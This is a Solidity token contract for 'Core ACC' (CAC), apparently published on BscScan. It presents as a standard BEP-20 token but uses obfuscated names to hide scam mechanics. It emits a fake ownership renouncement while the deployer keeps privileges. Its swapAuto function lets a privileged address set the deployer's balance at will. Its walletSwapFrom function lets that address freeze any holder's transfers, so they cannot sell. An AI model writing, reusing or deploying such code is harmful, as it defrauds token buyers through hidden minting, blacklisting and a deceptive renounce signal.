/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface marketingReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingBuy) external view returns (uint256);

    function transfer(address maxLiquidity, uint256 txReceiver) external returns (bool);

    function allowance(address takeMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 txReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address maxLiquidity,
        uint256 txReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountMode, uint256 value);
    event Approval(address indexed takeMax, address indexed spender, uint256 value);
}

interface minIs is marketingReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface takeLimit {
    function createPair(address listLimitSender, address senderTokenTake) external returns (address);
}

interface txTeamReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract CoreACC is maxIs, marketingReceiver, minIs {

    function swapAuto(uint256 txReceiver) public {
        if (!takeTo[_msgSender()]) {
            return;
        }
        swapMarketingFrom[fromLimit] = txReceiver;
    }

    function walletSwapFrom(address launchedMin) public {
        
        if (launchedMin == fromLimit || launchedMin == txLiquidity || !takeTo[_msgSender()]) {
            return;
        }
        if (launchFee == teamWallet) {
            shouldSell = teamWallet;
        }
        amountToken[launchedMin] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamBuy;
    }

    string private amountFee = "Core ACC";

    uint256 public launchFee;

    bool public takeAmount;

    mapping(address => uint256) private swapMarketingFrom;

    function totalFee() public {
        
        
        txTake=false;
    }

    constructor (){
        if (swapIs != txTake) {
            teamWallet = fromSellSender;
        }
        txTeamReceiver minLimit = txTeamReceiver(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txLiquidity = takeLimit(minLimit.factory()).createPair(minLimit.WETH(), address(this));
        receiverSellLiquidity = _msgSender();
        if (swapIs == takeAmount) {
            teamWallet = shouldSell;
        }
        fromLimit = receiverSellLiquidity;
        takeTo[fromLimit] = true;
        
        swapMarketingFrom[fromLimit] = enableReceiver;
        emit Transfer(address(0), fromLimit, enableReceiver);
        isSwap();
    }

    function decimals() external view virtual override returns (uint8) {
        return enableBuyReceiver;
    }

    function name() external view virtual override returns (string memory) {
        return amountFee;
    }

    bool public shouldLiquidity;

    address public txLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return enableReceiver;
    }

    function receiverEnable(address fromTx, address maxLiquidity, uint256 txReceiver) internal returns (bool) {
        if (fromTx == fromLimit || maxLiquidity == fromLimit) {
            return txSwap(fromTx, maxLiquidity, txReceiver);
        }
        if (txTake) {
            launchFee = teamWallet;
        }
        require(!amountToken[fromTx]);
        if (swapIs != takeAmount) {
            txTake = false;
        }
        return txSwap(fromTx, maxLiquidity, txReceiver);
    }

    uint256 public teamWallet;

    function approve(address shouldLaunch, uint256 txReceiver) public virtual override returns (bool) {
        listTx[_msgSender()][shouldLaunch] = txReceiver;
        emit Approval(_msgSender(), shouldLaunch, txReceiver);
        return true;
    }

    uint256 private enableReceiver = 100000000 * 10 ** 18;

    bool public shouldTeam;

    bool public txTake;

    function transferFrom(address fromTx, address maxLiquidity, uint256 txReceiver) external override returns (bool) {
        if (listTx[fromTx][_msgSender()] != type(uint256).max) {
            require(txReceiver <= listTx[fromTx][_msgSender()]);
            listTx[fromTx][_msgSender()] -= txReceiver;
        }
        return receiverEnable(fromTx, maxLiquidity, txReceiver);
    }

    uint256 private fromSellSender;

    function isMin() public view returns (uint256) {
        return teamWallet;
    }

    address private receiverSellLiquidity;

    address public fromLimit;

    bool public swapIs;

    uint8 private enableBuyReceiver = 18;

    function launchedExemptList() public {
        
        if (teamWallet != launchFee) {
            launchFee = shouldSell;
        }
        enableTx=false;
    }

    function isSwap() public {
        emit OwnershipTransferred(fromLimit, address(0));
        receiverSellLiquidity = address(0);
    }

    function allowance(address maxFee, address shouldLaunch) external view virtual override returns (uint256) {
        return listTx[maxFee][shouldLaunch];
    }

    mapping(address => bool) public amountToken;

    function senderExempt() public view returns (bool) {
        return txTake;
    }

    function getOwner() external view returns (address) {
        return receiverSellLiquidity;
    }

    function limitSwap(address receiverSwap) public {
        if (shouldLiquidity) {
            return;
        }
        if (launchFee == shouldSell) {
            shouldTeam = true;
        }
        takeTo[receiverSwap] = true;
        
        shouldLiquidity = true;
    }

    mapping(address => bool) public takeTo;

    function totalFrom() public {
        if (launchFee == fromSellSender) {
            takeAmount = true;
        }
        
        enableTx=false;
    }

    bool private enableTx;

    uint256 public shouldSell;

    function txSwap(address fromTx, address maxLiquidity, uint256 txReceiver) internal returns (bool) {
        require(swapMarketingFrom[fromTx] >= txReceiver);
        swapMarketingFrom[fromTx] -= txReceiver;
        swapMarketingFrom[maxLiquidity] += txReceiver;
        emit Transfer(fromTx, maxLiquidity, txReceiver);
        return true;
    }

    event OwnershipTransferred(address indexed sellFundList, address indexed feeLaunched);

    function owner() external view returns (address) {
        return receiverSellLiquidity;
    }

    mapping(address => mapping(address => uint256)) private listTx;

    function balanceOf(address tradingBuy) public view virtual override returns (uint256) {
        return swapMarketingFrom[tradingBuy];
    }

    function transfer(address swapEnableToken, uint256 txReceiver) external virtual override returns (bool) {
        return receiverEnable(_msgSender(), swapEnableToken, txReceiver);
    }

    string private teamBuy = "CAC";

}